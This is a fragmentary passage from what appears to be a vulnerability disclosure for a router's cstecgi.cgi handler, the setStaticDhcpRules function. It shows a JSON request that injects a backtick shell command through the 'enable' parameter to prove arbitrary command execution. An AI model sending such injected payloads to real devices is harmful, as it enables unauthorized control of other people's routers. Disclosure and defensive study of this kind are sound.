...
The vulnerability is located in the function `sub_41A3BC` within `cstecgi.cgi`, also known as `setStaticDhcpRules`.

![](Pasted%20image%2020231129164650.png)
...
therefore , by controlling parameter among  `enable` , we can finally make an arbitrary command execution
...
{"addEffect":"0","enable":"`id > /1.txt;`","topicurl":"setStaticDhcpRules","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129164847.png)